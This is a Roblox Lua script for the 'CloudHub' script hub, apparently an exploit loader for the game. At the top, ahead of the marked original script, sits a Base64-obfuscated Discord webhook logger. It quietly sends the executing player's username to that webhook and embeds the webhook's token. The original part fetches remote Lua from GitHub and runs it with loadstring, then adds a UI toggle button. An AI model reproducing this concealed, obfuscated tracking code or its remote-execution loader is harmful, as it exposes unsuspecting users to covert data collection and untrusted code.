-- Discord webhook logger (Base64 obfuscated)
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local encodedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NTAxMDY4MzAyODE3NzA0Ny9VUGtsVVhkdEpYckdlaWl0TGs3blFqTWR1QXQyNUVQSFZETDQ3RGhnaXZNc3ZaalNoeHVS
T09BSkw5WXpZV3VsbEcyaA=="

local function b64decode(data)
    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if x == '=' then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if #x ~= 8 then return '' end
        local c=0
        for i=1,8 do c=c + (x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

local webhook = b64decode(encodedWebhook)

local data = {
    content = "ðŸš¨ CloudHub script executed!",
    embeds = {{
        title = "Execution Alert",
        description = "Username: **" .. (Players.LocalPlayer and Players.LocalPlayer.Name or "Unknown") .. "**",
        color = 16711680,
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}

pcall(function()
    HttpService:PostAsync(
        webhook,
        HttpService:JSONEncode(data),
        Enum.HttpContentType.ApplicationJson
    )
end)

-- === BEGIN ORIGINAL SCRIPT ===

local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")

--> CloudHub (Updated) <--
loadstring(game:HttpGet("https://raw.githubusercontent.com/AlwanPandora/CloudHub-Script/refs/heads/main/Cloudhub.lua", true))()

--> CloudHub Variables <--
local DiscordUI = CoreGui:FindFirstChild("Discord")
local DiscordUIMainFrame = DiscordUI:FindFirstChild("MainFrame")

--> CloudHub V3 UI <--
DiscordUI.Enabled = false -- Start with UI disabled
DiscordUIMainFrame.Position = UDim2.new(0.5, 0, 0.5, 0) -- Set the position to the center

--> Toggle Variable <--
local ToggeTween = false

--> Creates ScreenGui <--
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = CoreGui
ScreenGui.Name = "CloudHub UI Toggle Button"
ScreenGui.ResetOnSpawn = false
ScreenGui.DisplayOrder = 999
ScreenGui.Enabled = true 
ScreenGui.IgnoreGuiInset = false
ScreenGui.AutoLocalize = true

--> Creates ImageButton Within ScreenGui <--
local imageButton = Instance.new("ImageButton")
imageButton.Parent = ScreenGui
imageButton.Name = "Toggle Button"
imageButton.Position = UDim2.new(0.15, 0, 0.5, 0) -- Middle-left position
imageButton.Size = UDim2.new(0.14, 0, 0.14, 0) -- Image size
imageButton.Image = "rbxassetid://104646045496948" -- Updated Image ID
imageButton.BackgroundTransparency = 1
imageButton.ScaleType = Enum.ScaleType.Fit 
imageButton.Active = true
imageButton.AnchorPoint = Vector2.new(0.5, 0.5)
imageButton.AutoButtonColor = true 
imageButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
imageButton.BorderSizePixel = 1
imageButton.ImageColor3 = Color3.fromRGB(255, 255, 255)
imageButton.ImageTransparency = 0
imageButton.Visible = true -- Ensure image appears first
imageButton.Draggable = true
imageButton.ZIndex = 999

--> Creates UICorner Within imageButton <--
local imageButtonUICorner = Instance.new("UICorner")
imageButtonUICorner.Parent = imageButton
imageButtonUICorner.CornerRadius = UDim.new(0.25, 0)

--> Event Handler For ImageButton On Mouse Button Click <--
imageButton.MouseButton1Click:Connect(function()
    ToggeTween = not ToggeTween

    if ToggeTween then
        DiscordUI.Enabled = true -- Show UI when clicked
        DiscordUIMainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    else
        DiscordUI.Enabled = false
    end
end)

--> Ensure Image Appears First on Execution <--
task.wait(1) -- Small delay for smoother appearance
imageButton.Visible = true
